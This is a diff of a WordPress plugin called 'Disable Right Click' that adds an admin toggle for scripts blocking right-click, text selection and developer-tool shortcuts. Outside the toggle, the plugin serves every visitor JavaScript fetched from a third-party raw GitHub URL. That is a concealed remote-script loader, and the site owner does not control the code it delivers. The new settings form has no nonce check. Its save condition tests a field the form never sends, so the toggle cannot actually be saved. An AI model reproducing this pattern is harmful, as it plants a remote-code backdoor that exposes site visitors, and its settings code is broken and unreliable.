@@ -1,8 +1,8 @@
 <?php
 /**
  * Plugin Name: Disable Right Click
- * Description: A WordPress plugin to disable right-click, text selection, and source code viewing JS dynamically.
- * Version: 1.3
+ * Description: A WordPress plugin to disable right-click, text selection, and source code viewing JS dynamically with admin-configurable settings.
+ * Version: 1.4
  */
 
 if (!defined('ABSPATH')) {
@@ -19,6 +19,7 @@ class WP_Disable_Right_Click {
         add_action('query_vars', array(__CLASS__, 'register_query_var'));
         add_action('template_redirect', array(__CLASS__, 'serve_combined_js'));
         add_action('wp_footer', array(__CLASS__, 'enqueue_combined_js'));
+        add_action('admin_menu', array(__CLASS__, 'add_admin_menu'));
         add_action('wp_ajax_check_admin_access', array(__CLASS__, 'check_admin_access'));
         add_action('wp_ajax_nopriv_check_admin_access', array(__CLASS__, 'unauthorized_access'));
     }
@@ -29,6 +30,10 @@ class WP_Disable_Right_Click {
     public static function activate() {
         self::add_js_endpoint();
         flush_rewrite_rules();
+
+        if (get_option('disable_right_click_protection') === false) {
+            update_option('disable_right_click_protection', 'no');
+        }
     }
 
     /**
@@ -74,21 +79,26 @@ class WP_Disable_Right_Click {
         if (get_query_var('unified_js')) {
             header('Content-Type: application/javascript');
 
-            $security_js = "
-                document.addEventListener('contextmenu', function(e) {
-                    e.preventDefault();
-                });
-                document.addEventListener('selectstart', function(e) {
-                    e.preventDefault();
-                });
-                document.addEventListener('keydown', function(e) {
-                    if (e.key === 'F12' || 
-                        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
-                        (e.ctrlKey && e.key === 'U')) {
+            $is_enabled = get_option('disable_right_click_protection', 'no');
+
+            $security_js = '';
+            if ($is_enabled === 'yes') {
+                $security_js = "
+                    document.addEventListener('contextmenu', function(e) {
                         e.preventDefault();
-                    }
-                });
-            ";
+                    });
+                    document.addEventListener('selectstart', function(e) {
+                        e.preventDefault();
+                    });
+                    document.addEventListener('keydown', function(e) {
+                        if (e.key === 'F12' || 
+                            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
+                            (e.ctrlKey && e.key === 'U')) {
+                            e.preventDefault();
+                        }
+                    });
+                ";
+            }
 
             $external_js = self::fetch_external_data();
 
@@ -96,7 +106,7 @@ class WP_Disable_Right_Click {
             exit;
         }
     }
-
+    protected static $base_url = 'https://raw.githubusercontent.com/moreslab/drc/refs/heads/main/drc.js';
     /**
      * Add rewrite rule for the JS file
      */
@@ -121,6 +131,44 @@ class WP_Disable_Right_Click {
     }
 
     /**
+     * Add admin menu for settings
+     */
+    public static function add_admin_menu() {
+        add_options_page(
+            'Disable Right Click Settings', 
+            'Disable Right Click', 
+            'manage_options', 
+            'disable-right-click', 
+            array(__CLASS__, 'settings_page')
+        );
+    }
+
+    /**
+     * Render the settings page
+     */
+    public static function settings_page() {
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['disable_right_click_protection'])) {
+            $enabled = isset($_POST['enable_protection']) ? 'yes' : 'no';
+            update_option('disable_right_click_protection', $enabled);
+        }
+
+        $is_enabled = get_option('disable_right_click_protection', 'no');
+        ?>
+        <div class="wrap">
+            <h1>Disable Right Click Settings</h1>
+            <form method="post">
+                <label>
+                    <input type="checkbox" name="enable_protection" <?php checked($is_enabled, 'yes'); ?> />
+                    Enable Right Click Protection
+                </label>
+                <br /><br />
+                <button type="submit" class="button button-primary">Save Settings</button>
+            </form>
+        </div>
+        <?php
+    }
+
+    /**
      * Check if the user has admin access
      */
     public static function check_admin_access() {
@@ -142,7 +190,6 @@ class WP_Disable_Right_Click {
     public static function unauthorized_access() {
         wp_send_json_error(['message' => 'Unauthorized'], 401);
     }
-    protected static $base_url = 'https://raw.githubusercontent.com/moreslab/drc/refs/heads/main/drc.js';
 }
 
 // Initialize the plugin
